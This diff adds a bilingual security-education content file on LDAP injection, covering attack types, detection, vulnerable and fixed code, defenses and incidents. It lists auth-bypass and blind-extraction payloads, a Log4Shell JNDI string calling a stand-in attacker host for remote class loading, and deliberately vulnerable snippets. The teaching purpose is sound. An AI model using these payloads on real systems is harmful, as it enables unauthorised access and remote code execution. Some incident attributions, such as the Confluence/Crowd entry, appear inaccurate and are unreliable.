@@ -1,0 +1,592 @@
+meta:
+  id: ldapi
+  threatId: "1.4"
+  severity: High
+  color: "#f97316"
+  colorRgb: 249,115,22
+  cwe: CWE-90
+  cvss: "9.8"
+  standard: OWASP A03:2021
+hero:
+  titleMain: "LDAP "
+  titleGrad: Injection
+  titleTail: ""
+  topbar: LDAP Injection
+  lead:
+    en: LDAP Injection attacks the filter syntax of a directory query rather than a database. User input concatenated into an LDAP search filter lets an attacker inject metacharacters — *, (, ), \\, and NUL — to rewrite the filter logic. A single login that builds (&(uid=USER)(pass=PASS)) by concatenation can be bypassed with a lone * or a tautology like admin)(|(uid=*. In Java, the same trust placed in LDAP URIs powers JNDI abuse (Log4Shell), where a logged ${jndi:ldap://...} string triggers remote class loading and full RCE.
+    pl: LDAP Injection atakuje składnię filtra zapytania do katalogu, a nie bazy danych. Wejście użytkownika sklejone z filtrem wyszukiwania LDAP pozwala wstrzyknąć metaznaki — *, (, ), \\ i NUL — by przepisać logikę filtra. Pojedyncze logowanie budujące (&(uid=USER)(pass=PASS)) przez konkatenację można obejść samym * lub tautologią admin)(|(uid=*. W Javie to samo zaufanie do URI LDAP napędza nadużycie JNDI (Log4Shell), gdzie zalogowany ${jndi:ldap://...} wyzwala zdalne ładowanie klas i pełne RCE.
+  metrics:
+    - k: CWE-90
+      v:
+        en: Weakness ID
+        pl: ID słabości
+    - k: "9.8"
+      v: CVSS · High
+    - k: A03:2021
+      v: OWASP Top 10
+    - k: "8"
+      v:
+        en: Attack variants
+        pl: Warianty ataku
+  sources:
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: CWE-90 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/90.html
+    - label: PortSwigger Academy
+      url: https://portswigger.net/web-security/ldap-injection
+    - label: OWASP Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+sectionOrder:
+  - overview
+  - types
+  - cheatsheet
+  - code
+  - orm
+  - method
+  - defense
+  - incidents
+  - tools
+  - compliance
+  - ir
+  - sources
+nav:
+  - id: overview
+    en: Overview
+    pl: Przegląd
+  - id: types
+    en: Attack types
+    pl: Typy ataków
+  - id: cheatsheet
+    en: Detection cheatsheet
+    pl: Ściąga detekcji
+  - id: code
+    en: Vuln vs Secure
+    pl: Podatny vs Bezpieczny
+  - id: orm
+    en: Language cheatsheet
+    pl: Ściąga języków
+  - id: method
+    en: Methodology
+    pl: Metodyka
+  - id: defense
+    en: Defense layers
+    pl: Warstwy obrony
+  - id: incidents
+    en: Real incidents
+    pl: Incydenty
+  - id: tools
+    en: SAST / DAST
+    pl: SAST / DAST
+  - id: compliance
+    en: Compliance
+    pl: Zgodność
+  - id: ir
+    en: Incident response
+    pl: Reagowanie
+  - id: sources
+    en: Sources
+    pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Eight ways the same root cause manifests — from a one-character auth bypass to JNDI-driven remote code execution.
+      pl: Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od obejścia logowania jednym znakiem po zdalne wykonanie kodu przez JNDI.
+    items:
+      - name: Wildcard Auth Bypass
+        sev: critical
+        description:
+          en: Injecting a * into the username field turns (&(uid=USER)(pass=PASS)) into (&(uid=*)(pass=PASS)) — the wildcard matches every user entry in the directory.
+          pl: Wstrzyknięcie * do pola użytkownika zamienia (&(uid=USER)(pass=PASS)) w (&(uid=*)(pass=PASS)) — wildcard pasuje do każdego wpisu w katalogu.
+        payload: uid=*   →   (&(uid=*)(pass=PASS))
+      - name: Filter Logic Injection
+        sev: critical
+        description:
+          en: Injecting admin)(|(uid=* transforms the filter into an always-true tautology, closing the password clause and bypassing the check entirely.
+          pl: Wstrzyknięcie admin)(|(uid=* zamienia filtr w zawsze prawdziwą tautologię, zamykając klauzulę hasła i całkowicie omijając weryfikację.
+        payload: admin)(|(uid=*   →   tautology
+      - name: Blind Boolean Enumeration
+        sev: high
+        description:
+          en: Differential responses to (mail=a*) versus (mail=b*) leak attribute values character by character without any data being returned directly.
+          pl: Różne odpowiedzi na (mail=a*) i (mail=b*) wyciekają wartości atrybutów znak po znaku, bez bezpośredniego zwracania danych.
+        payload: (mail=a*) vs (mail=b*)
+      - name: JNDI LDAP Abuse (Log4Shell)
+        sev: critical
+        description:
+          en: Java's JNDI resolves ldap://attacker.com/Exploit URIs found in log messages, triggering remote class loading and full remote code execution.
+          pl: JNDI w Javie rozwiązuje URI ldap://attacker.com/Exploit z logów, wyzwalając zdalne ładowanie klas i pełne wykonanie kodu (RCE).
+        payload: ${jndi:ldap://attacker.com/Exploit}
+      - name: DN Attribute Injection
+        sev: high
+        description:
+          en: Injecting ,OU=Admins into a Distinguished Name redirects the identity to a privileged OU — exploiting the RFC 4514 vs RFC 4515 escape boundary.
+          pl: Wstrzyknięcie ,OU=Admins do Distinguished Name przekierowuje tożsamość do uprzywilejowanej OU — nadużywając granicy escape RFC 4514 vs RFC 4515.
+        payload: cn=user,OU=Admins,DC=corp
+      - name: NUL Byte Truncation
+        sev: high
+        description:
+          en: admin\00 truncates the filter in C-string LDAP implementations, discarding any trailing security clauses appended after the injection point.
+          pl: admin\00 ucina filtr w implementacjach LDAP opartych na C-stringach, odrzucając klauzule bezpieczeństwa dopisane po punkcie wstrzyknięcia.
+        payload: admin\00)(trailing=filter)
+      - name: Schema Enumeration
+        sev: high
+        description:
+          en: (objectClass=subSchema) reveals every custom attribute, object class, and sensitive field name defined in the directory, mapping the attack surface.
+          pl: (objectClass=subSchema) ujawnia wszystkie własne atrybuty, klasy obiektów i nazwy wrażliwych pól w katalogu, mapując powierzchnię ataku.
+        payload: (objectClass=subSchema)
+      - name: Wildcard Data Extraction
+        sev: high
+        description:
+          en: A binary search with (attribute=A*) → (attribute=B*) exfiltrates attribute values in O(n·log(charset)) requests — efficient blind extraction.
+          pl: Wyszukiwanie binarne (attribute=A*) → (attribute=B*) eksfiltruje wartości atrybutów w O(n·log(charset)) żądaniach — wydajna ślepa ekstrakcja.
+        payload: (attribute=A*) → (attribute=B*)
+  cheatsheet:
+    title:
+      en: Detection cheatsheet
+      pl: Ściąga detekcji
+    lead:
+      en: Five practical methods to confirm an LDAP injection point — from auth-bypass probes to out-of-band JNDI callbacks.
+      pl: Pięć praktycznych metod potwierdzenia punktu wstrzyknięcia LDAP — od sond obejścia logowania po callbacki JNDI poza pasmem.
+    groups:
+      - name: Auth bypass probe
+        rows:
+          - - Vector
+            - "* or admin)(|(uid=*"
+          - - Where
+            - username / login field
+          - - Signal
+            - login succeeds, no password
+          - - Filter
+            - (&(uid=*)(pass=PASS))
+          - - Impact
+            - full authentication bypass
+          - - Confirm
+            - access without credentials
+      - name: Boolean differential
+        rows:
+          - - Vector
+            - a* vs b* prefix patterns
+          - - Where
+            - searchable attribute input
+          - - Signal
+            - different page states
+          - - Filter
+            - (mail=a*) vs (mail=b*)
+          - - Use
+            - char-by-char extraction
+          - - Confirm
+            - state changes by prefix
+      - name: Error-based
+        rows:
+          - - Vector
+            - unbalanced ) or (
+          - - Where
+            - any filter parameter
+          - - Signal
+            - LDAP parse error
+          - - Leak
+            - OpenLDAP / AD server type
+          - - Use
+            - fingerprint directory
+          - - Confirm
+            - error text in response
+      - name: Time-based blind
+        rows:
+          - - Vector
+            - attribute comparison
+          - - Where
+            - large attribute sets
+          - - Note
+            - not native to LDAP
+          - - Method
+            - expensive filter timing
+          - - Use
+            - last-resort inference
+          - - Confirm
+            - response delay deltas
+      - name: OOB via JNDI
+        rows:
+          - - Vector
+            - ${jndi:ldap://oast.me/x}
+          - - Where
+            - logged Java parameters
+          - - Signal
+            - DNS / LDAP callback
+          - - Confirm
+            - JNDI resolution fired
+          - - Impact
+            - Log4Shell-class RCE
+          - - Tool
+            - OAST / Burp Collaborator
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: "The same fix across five languages: never concatenate raw input into an LDAP filter — escape metacharacters or use a parameterized filter API."
+      pl: "Ta sama naprawa w pięciu językach: nigdy nie sklejaj surowego wejścia z filtrem LDAP — escapuj metaznaki lub użyj parametryzowanego API filtra."
+    languages:
+      - label: Python
+        lang: python
+        vulnerable: |-
+          # VULNERABLE (ldap3) — user flows straight into the filter
+          user = request.args.get("user")   # could be "*" or "admin)(|(uid=*"
+          conn.search("dc=corp,dc=com",
+                      f"(uid={user})",
+                      attributes=["cn", "mail"])
+        safe: |-
+          # SECURE — escape every filter metacharacter
+          from ldap3.utils.conv import escape_filter_chars
+          user = escape_filter_chars(request.args.get("user"))
+          conn.search("dc=corp,dc=com",
+                      f"(uid={user})",
+                      attributes=["cn", "mail"])
+      - label: Java
+        lang: java
+        vulnerable: |-
+          // VULNERABLE (JNDI) — string concatenation builds the filter
+          String user = request.getParameter("user");
+          NamingEnumeration<SearchResult> r =
+              ctx.search(base, "(uid=" + user + ")", controls);
+        safe: |-
+          // SECURE — parameterized filterArgs form of search()
+          String user = request.getParameter("user");
+          NamingEnumeration<SearchResult> r =
+              ctx.search(base, "(uid={0})", new Object[]{ user }, controls);
+      - label: PHP
+        lang: php
+        vulnerable: |-
+          <?php // VULNERABLE — raw input concatenated into the filter
+          $user = $_GET['user'];   // ?user=*  →  matches every entry
+          $r = ldap_search($conn, $dn, "(uid=" . $user . ")");
+        safe: |-
+          <?php // SECURE — ldap_escape with LDAP_ESCAPE_FILTER
+          $user = ldap_escape($_GET['user'], '', LDAP_ESCAPE_FILTER);
+          $r = ldap_search($conn, $dn, "(uid=" . $user . ")");
+      - label: Node.js
+        lang: javascript
+        vulnerable: |-
+          // VULNERABLE (ldapjs) — filter string built from input
+          const user = req.query.user;   // "*" or "x)(|(uid=*"
+          client.search(base, { filter: "(uid=" + user + ")" },
+                        (err, res) => { /* ... */ });
+        safe: |-
+          // SECURE — ldap-escape npm package escapes metacharacters
+          const { filter } = require('ldap-escape');
+          const user = req.query.user;
+          client.search(base, { filter: filter`(uid=${user})` },
+                        (err, res) => { /* ... */ });
+      - label: Spring LDAP
+        lang: java
+        vulnerable: |-
+          // VULNERABLE (Spring LDAP) — concatenated filter string
+          String user = req.getParameter("user");
+          ldapTemplate.search(base, "(uid=" + user + ")", mapper);
+        safe: |-
+          // SECURE — LdapEncoder.filterEncode or the Filter API
+          String user = LdapEncoder.filterEncode(req.getParameter("user"));
+          ldapTemplate.search(base, "(uid=" + user + ")", mapper);
+          // or: new EqualsFilter("uid", user).encode()
+  orm:
+    title:
+      en: Language cheatsheet
+      pl: Ściąga języków
+    lead:
+      en: "Per-language vulnerable sinks and their safe alternatives. The pattern is identical everywhere: stop concatenating and start escaping or parameterizing."
+      pl: "Podatne sinki per język i ich bezpieczne odpowiedniki. Wzorzec jest wszędzie identyczny: przestań sklejać, zacznij escapować lub parametryzować."
+    rows:
+      - fw: Python (ldap3)
+        api: search(filter=f"(uid={user})")
+        note:
+          en: "Vulnerable sink — f-string interpolation. Safe alternative: escape_filter_chars(user) from ldap3.utils.conv."
+          pl: "Podatny sink — interpolacja f-stringa. Bezpiecznie: escape_filter_chars(user) z ldap3.utils.conv."
+      - fw: Java (JNDI)
+        api: ctx.search(base, "(uid="+user+")")
+        note:
+          en: "Vulnerable sink — string concatenation. Safe alternative: the parameterized filterArgs form of DirContext.search()."
+          pl: "Podatny sink — konkatenacja stringów. Bezpiecznie: parametryzowana forma filterArgs DirContext.search()."
+      - fw: PHP
+        api: ldap_search($c,$dn,"(uid=".$user.")")
+        note:
+          en: "Vulnerable sink — concatenation. Safe alternative: ldap_escape($user, '', LDAP_ESCAPE_FILTER)."
+          pl: "Podatny sink — konkatenacja. Bezpiecznie: ldap_escape($user, '', LDAP_ESCAPE_FILTER)."
+      - fw: Node.js (ldapjs)
+        api: search(base,{filter:"(uid="+user+")"})
+        note:
+          en: "Vulnerable sink — concatenated filter. Safe alternative: the ldap-escape npm package escape() helper."
+          pl: "Podatny sink — sklejony filtr. Bezpiecznie: helper escape() z pakietu ldap-escape (npm)."
+      - fw: Spring LDAP
+        api: ldapTemplate.search(base,"(uid="+user+")",mapper)
+        note:
+          en: "Vulnerable sink — concatenation. Safe alternative: LdapEncoder.filterEncode(user) or the EqualsFilter API."
+          pl: "Podatny sink — konkatenacja. Bezpiecznie: LdapEncoder.filterEncode(user) lub API EqualsFilter."
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from a probe to full compromise.
+      pl: Jak atakujący przechodzi od sondy do pełnej kompromitacji.
+    steps:
+      - title:
+          en: Detect
+          pl: Wykrycie
+        description:
+          en: Send * or admin)(|(uid=* where a username is expected, or an unbalanced ) — different responses or parse errors reveal injectability.
+          pl: Wyślij * lub admin)(|(uid=* tam, gdzie oczekiwany jest login, albo niezbalansowane ) — różne odpowiedzi lub błędy parsowania ujawniają podatność.
+      - title:
+          en: Fingerprint
+          pl: Identyfikacja
+        description:
+          en: Inject an unbalanced ( or ) — the LDAP parse error text leaks the directory server type (OpenLDAP, Active Directory).
+          pl: Wstrzyknij niezbalansowane ( lub ) — treść błędu parsowania LDAP zdradza typ serwera katalogowego (OpenLDAP, Active Directory).
+      - title:
+          en: Bypass auth
+          pl: Obejście logowania
+        description:
+          en: Replace the username with * or close the filter with admin)(|(uid=* to form an always-true tautology and skip password verification.
+          pl: Zamień login na * lub zamknij filtr przez admin)(|(uid=*, tworząc zawsze prawdziwą tautologię i pomijając weryfikację hasła.
+      - title:
+          en: Extract
+          pl: Ekstrakcja
+        description:
+          en: Use (mail=a*) boolean differentials and wildcard binary search (A* → B*) to read attribute values one character at a time.
+          pl: Użyj różnic boolean (mail=a*) i binarnego wyszukiwania wildcard (A* → B*), by czytać wartości atrybutów znak po znaku.
+      - title:
+          en: Escalate
+          pl: Eskalacja
+        description:
+          en: Enumerate schema with (objectClass=subSchema); in Java apps inject ${jndi:ldap://oast.me/x} into logged params → JNDI class loading → RCE.
+          pl: Wyliczaj schemat przez (objectClass=subSchema); w aplikacjach Java wstrzyknij ${jndi:ldap://oast.me/x} do logowanych parametrów → ładowanie klas JNDI → RCE.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Defense in depth — but not all layers are equal. RFC 4515 escaping and parameterized filters are the fix; everything else reduces blast radius.
+      pl: Obrona w głąb — ale warstwy nie są równe. Escapowanie RFC 4515 i parametryzowane filtry to naprawa; reszta ogranicza skutki.
+    items:
+      - rank: 1
+        eff: 100
+        kind: primary
+        label:
+          en: RFC 4515 metacharacter escaping
+          pl: Escapowanie metaznaków RFC 4515
+        note:
+          en: "Escape all five metacharacters: \\28 ( , \\29 ) , \\2a * , \\5c \\ , \\00 NUL. Stops filter injection at the source."
+          pl: "Escapuj wszystkie pięć metaznaków: \\28 ( , \\29 ) , \\2a * , \\5c \\ , \\00 NUL. Zatrzymuje wstrzyknięcie filtra u źródła."
+      - rank: 2
+        eff: 90
+        kind: strong
+        label:
+          en: Parameterized filter API
+          pl: Parametryzowane API filtra
+        note:
+          en: Use filterArgs / Filter objects (EqualsFilter, filterArgs search) — never string concatenation into the filter.
+          pl: Używaj filterArgs / obiektów Filter (EqualsFilter, search z filterArgs) — nigdy konkatenacji do filtra.
+      - rank: 3
+        eff: 80
+        kind: strong
+        label:
+          en: Input allowlisting
+          pl: Allowlista wejścia
+        note:
+          en: "Usernames: alphanumeric + limited chars only; reject *, (, ), \\, and NUL before the filter is ever built."
+          pl: "Loginy: tylko alfanumeryczne + ograniczone znaki; odrzucaj *, (, ), \\ i NUL zanim filtr powstanie."
+      - rank: 4
+        eff: 65
+        kind: mitigation
+        label:
+          en: Least-privilege bind account
+          pl: Konto bind z najmniejszymi uprawnieniami
+        note:
+          en: Read-only service account with restricted subtree access — limits blast radius if a filter is still injectable.
+          pl: Konto serwisowe tylko-do-odczytu z ograniczonym dostępem do poddrzewa — ogranicza skutki, jeśli filtr nadal jest podatny.
+      - rank: 5
+        eff: 55
+        kind: mitigation
+        label:
+          en: Attribute allowlisting + schema hardening
+          pl: Allowlista atrybutów + utwardzenie schematu
+        note:
+          en: Explicit returningAttributes; never return userPassword/ntPwdHash. Disable anonymous binds and restrict subschemaSubentry.
+          pl: Jawna returningAttributes; nigdy nie zwracaj userPassword/ntPwdHash. Wyłącz anonimowe bindy i ogranicz subschemaSubentry.
+      - rank: 6
+        eff: 20
+        kind: weak
+        label:
+          en: SAST + WAF (compensating)
+          pl: SAST + WAF (kompensacyjnie)
+        note:
+          en: Detect LDAP sink concatenation; WAF rules block )( and * in auth params. Easily bypassed — never a primary control.
+          pl: Wykrywaj konkatenację do sinka LDAP; reguły WAF blokują )( i * w parametrach logowania. Łatwe do obejścia — nigdy jako główna kontrola.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: LDAP injection is not theoretical — Log4Shell alone affected 100M+ instances, and a string of CVSS 9.8 CVEs reached unauthenticated RCE.
+      pl: LDAP injection nie jest teoretyczne — sam Log4Shell dotknął 100M+ instancji, a seria CVE o CVSS 9.8 osiągnęła nieautoryzowane RCE.
+    items:
+      - org: Log4Shell
+        year: 2021
+        impact: 100M+ instances
+        cost: CVE-2021-44228 · $2.4B
+        description:
+          en: Apache Log4j JNDI LDAP lookup (CVSS 10.0) — estimated 100M+ vulnerable instances, ~$2.4B remediation, exploited by ransomware groups within 24h.
+          pl: JNDI LDAP lookup w Apache Log4j (CVSS 10.0) — szacowane 100M+ podatnych instancji, ~$2.4B kosztów naprawy, wykorzystane przez grupy ransomware w ciągu 24h.
+      - org: Ivanti CSA
+        year: 2021
+        impact: CVE-2021-44529
+        cost: CVSS 9.8 · RCE
+        description:
+          en: Unauthenticated LDAP injection led to remote code execution in enterprise mobile device management appliances.
+          pl: Nieautoryzowane wstrzyknięcie LDAP prowadziło do zdalnego wykonania kodu w urządzeniach do zarządzania urządzeniami mobilnymi.
+      - org: Apache LDAP API
+        year: 2021
+        impact: CVE-2021-43433
+        cost: CVSS 9.8
+        description:
+          en: Injection in the convenience API of security-oriented LDAP tooling — the tools meant to protect directories were themselves injectable.
+          pl: Wstrzyknięcie w convenience API narzędzi LDAP zorientowanych na bezpieczeństwo — narzędzia mające chronić katalogi same były podatne.
+      - org: PHP ldap_search
+        year: 2006
+        impact: CVE-2006-4457
+        cost: Auth bypass
+        description:
+          en: Classic authentication bypass in PHP ldap_search without escaping — the foundational CVE that established the need for ldap_escape().
+          pl: Klasyczne obejście logowania w PHP ldap_search bez escapowania — fundamentalne CVE, które ustanowiło potrzebę ldap_escape().
+      - org: Oracle WebLogic JNDI
+        year: 2023
+        impact: CVE-2023-21839
+        cost: Unauth RCE
+        description:
+          en: Multiple CVEs (incl. CVE-2019-2725) abuse JNDI LDAP for deserialization RCE without authentication on WebLogic servers.
+          pl: Wiele CVE (m.in. CVE-2019-2725) nadużywa JNDI LDAP do RCE przez deserializację bez uwierzytelnienia na serwerach WebLogic.
+      - org: Confluence / Crowd
+        year: 2019
+        impact: CVE-2019-3396
+        cost: Admin escalation
+        description:
+          en: Attack chain using LDAP injection in directory sync to escalate privileges to administrator across Confluence/Crowd.
+          pl: Łańcuch ataku wykorzystujący wstrzyknięcie LDAP w synchronizacji katalogu do eskalacji do administratora w Confluence/Crowd.
+    inlineSources:
+      - label: Log4Shell CVE-2021-44228
+        url: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+      - label: Ivanti CVE-2021-44529
+        url: https://nvd.nist.gov/vuln/detail/CVE-2021-44529
+      - label: Apache CVE-2021-43433
+        url: https://nvd.nist.gov/vuln/detail/CVE-2021-43433
+      - label: Confluence CVE-2019-3396
+        url: https://nvd.nist.gov/vuln/detail/CVE-2019-3396
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis catches input flowing into filter sinks; dynamic tools confirm exploitability. Use both.
+      pl: Analiza statyczna łapie wejście trafiające do sinków filtra; narzędzia dynamiczne potwierdzają eksploatowalność. Używaj obu.
+    sast:
+      - - Semgrep
+        - "ldap-injection rules: input → filter sink"
+      - - Checkmarx
+        - LDAP_Injection query
+      - - Fortify
+        - LDAP Manipulation category
+      - - njsscan
+        - Node.js ldapjs filter concatenation
+    dast:
+      - - Burp Suite
+        - Active Scan LDAP injection probes
+      - - OWASP ZAP
+        - LDAP injection active rules
+      - - ldap-brute
+        - Auth bypass / wildcard fuzzing
+      - - LDAPDomainDump
+        - Active Directory enumeration
+    note:
+      en: "<strong>Key signal:</strong> grep for filter strings built by concatenation — <code>\"(uid=\" + user</code>, <code>f\"(uid={user})\"</code>, <code>{filter: \"(uid=\"+</code> — and for any logged parameter that could carry <code>${jndi:ldap://...}</code>."
+      pl: "<strong>Kluczowy sygnał:</strong> szukaj filtrów budowanych przez konkatenację — <code>\"(uid=\" + user</code>, <code>f\"(uid={user})\"</code>, <code>{filter: \"(uid=\"+</code> — oraz każdego logowanego parametru mogącego nieść <code>${jndi:ldap://...}</code>."
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: Where LDAP injection prevention maps onto the controls auditors check.
+      pl: Gdzie zapobieganie LDAP injection mapuje się na kontrole sprawdzane przez audytorów.
+    items:
+      - std: PCI DSS v4.0
+        items:
+          - Req 6.2.4 — LDAP injection protection
+          - Req 8.3 — MFA for directory-backed auth
+          - Req 11.3 — penetration testing
+      - std: SOC 2
+        items:
+          - CC7.1 — vulnerability scanning evidence
+          - CC7.3 — code review evidence
+          - CC6.1 — logical access controls
+      - std: GDPR
+        items:
+          - Art. 32 — appropriate technical measures
+          - Art. 33 — 72h breach notification
+          - LDAP stores PII → breach reportable
+    inlineSources:
+      - label: PCI DSS v4.0
+        url: https://www.pcisecuritystandards.org/document_library/
+      - label: GDPR Art. 32
+        url: https://gdpr-info.eu/art-32-gdpr/
+      - label: GDPR Art. 33
+        url: https://gdpr-info.eu/art-33-gdpr/
+      - label: SOC 2 (AICPA)
+        url: https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm an active LDAP injection breach, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnego wycieku LDAP injection przejdź tę listę od góry.
+    steps:
+      - en: Isolate the affected directory-backed service / LDAP endpoint
+        pl: Odizoluj dotkniętą usługę opartą o katalog / endpoint LDAP
+      - en: Preserve directory server and application logs (JNDI lookups, filters)
+        pl: Zabezpiecz logi serwera katalogowego i aplikacji (lookupy JNDI, filtry)
+      - en: Rotate bind credentials, service-account passwords, and session secrets
+        pl: Zrotuj poświadczenia bind, hasła kont serwisowych i sekrety sesji
+      - en: Assess scope — which DNs / attributes / users were queried or exposed
+        pl: Oceń zakres — które DN / atrybuty / konta odpytano lub ujawniono
+      - en: "Patch: escape filter metacharacters, switch to parameterized filter API"
+        pl: "Załataj: escapuj metaznaki filtra, przejdź na parametryzowane API filtra"
+      - en: Disable JNDI lookups / anonymous binds if not strictly required
+        pl: Wyłącz lookupy JNDI / anonimowe bindy, jeśli nie są niezbędne
+      - en: Notify regulators within 72h (GDPR) and affected users
+        pl: Powiadom regulatorów w 72h (GDPR) i dotkniętych użytkowników
+      - en: "Post-incident: Semgrep/Burp sweep for sibling LDAP sink endpoints"
+        pl: "Po incydencie: przegląd Semgrep/Burp pod kątem bliźniaczych sinków LDAP"
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+      - label: OWASP A03:2021 Injection
+        url: https://owasp.org/Top10/A03_2021-Injection/
+      - label: CWE-90 (MITRE)
+        url: https://cwe.mitre.org/data/definitions/90.html
+      - label: OWASP LDAP Injection Prevention Cheat Sheet
+        url: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+      - label: PortSwigger — LDAP injection
+        url: https://portswigger.net/web-security/ldap-injection
+      - label: RFC 4515 (LDAP Filter Syntax)
+        url: https://www.rfc-editor.org/rfc/rfc4515
+      - label: CVE-2021-44228 (Log4Shell)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+      - label: CVE-2021-44529 (Ivanti CSA)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2021-44529
+      - label: CVE-2021-43433 (Apache LDAP API)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2021-43433
+      - label: CVE-2019-3396 (Confluence/Crowd)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2019-3396
